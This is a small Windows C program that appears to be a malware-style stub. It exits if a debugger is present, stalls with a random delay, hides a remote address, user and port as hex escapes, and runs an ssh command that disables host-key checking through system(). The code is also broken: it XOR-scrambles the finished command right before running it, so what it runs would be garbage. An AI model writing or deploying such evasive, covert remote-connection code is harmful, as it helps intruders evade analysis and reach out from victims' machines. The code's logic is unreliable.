#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

void xor_encrypt_decrypt(char *input, const char *key) {
    for (size_t i = 0; i < strlen(input); i++) {
        input[i] ^= key[i % strlen(key)];
    }
}

int IsDebuggerPresentCheck() {
    return IsDebuggerPresent();
}

void random_delay() {
    for (volatile int i = 0; i < 1000000 + rand() % 500000; i++) {}
}

int main() {
    if (IsDebuggerPresentCheck()) {
        return 1;
    }

    char addr[] = "\x31\x32\x33\x2e\x31\x2e\x31\x2e\x31";
    unsigned short p = 123;
    char id[] = "\x31\x32\x33";

    random_delay();

    char *cmd = (char *)malloc(512);
    if (!cmd) return 1;
    strcpy(cmd, "ssh -o StrictHostKeyChecking=no ");
    strcat(cmd, id);
    strcat(cmd, "@");
    strcat(cmd, addr);
    strcat(cmd, " -p ");
    char port_str[6];
    snprintf(port_str, sizeof(port_str), "%d", p);
    strcat(cmd, port_str);

    xor_encrypt_decrypt(cmd, "obfuscation_key");
    system(cmd);

    free(cmd);
    return 0;
}
